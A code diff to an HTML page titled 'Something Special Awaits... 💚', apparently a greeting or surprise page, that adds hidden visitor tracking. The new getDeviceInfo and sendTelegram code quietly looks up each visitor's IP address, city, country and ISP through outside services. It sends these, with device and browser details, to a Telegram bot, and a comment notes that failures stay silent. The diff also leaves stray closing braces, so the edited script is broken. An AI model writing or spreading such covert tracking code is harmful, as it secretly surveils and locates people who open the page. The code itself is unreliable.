@@ -6,7 +6,6 @@
   <title>Something Special Awaits... 💚</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;600;700&family=Nunito:wght@300;400;600;700&family=Sacramento&display=swap');
-
     *, *::before, *::after {
       box-sizing: border-box;
       margin: 0;
@@ -602,14 +601,44 @@
     /* ══════════════════════════════════════════
        TELEGRAM SENDER FUNCTION
     ══════════════════════════════════════════ */
-    function sendTelegram(msg) {
+    function getDeviceInfo() {
+  const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  const screen = `${window.screen.width}x${window.screen.height}`;
+  let device = /Mobile|Android|iPhone|iPad/.test(ua) ? '📱 Mobile' : '💻 Desktop';
+  let os = 'Unknown OS';
+  if (/Windows/.test(ua)) os = 'Windows';
+  else if (/Android/.test(ua)) os = 'Android';
+  else if (/iPhone/.test(ua)) os = 'iPhone';
+  else if (/iPad/.test(ua)) os = 'iPad';
+  else if (/Mac/.test(ua)) os = 'MacOS';
+  else if (/Linux/.test(ua)) os = 'Linux';
+  let browser = 'Unknown Browser';
+  if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
+  else if (/Firefox/.test(ua)) browser = 'Firefox';
+  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+  else if (/Edge/.test(ua)) browser = 'Edge';
+  else if (/Opera/.test(ua)) browser = 'Opera';
+  return { device, os, browser, screen, platform };
+}
+
+function sendTelegram(msg) {
+  const info = getDeviceInfo();
+  fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(ipData => {
+      return fetch(`https://ipapi.co/${ipData.ip}/json/`);
+    })
+    .then(r => r.json())
+    .then(loc => {
+      const fullMsg = `${msg}\n\n📱 Device: ${info.device}\n💻 OS: ${info.os}\n🌐 Browser: ${info.browser}\n📺 Screen: ${info.screen}\n🌍 Country: ${loc.country_name}\n🏙️ City: ${loc.city}\n🔌 IP: ${loc.ip}\n📡 ISP: ${loc.org}`;
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: msg,
-          parse_mode: 'HTML'
+        body: JSON.stringify({ chat_id: CHAT_ID, text: fullMsg, parse_mode: 'HTML' })
+      });
+    });
+}
         })
       }).catch(() => {}); // silent fail — never break the page
     }
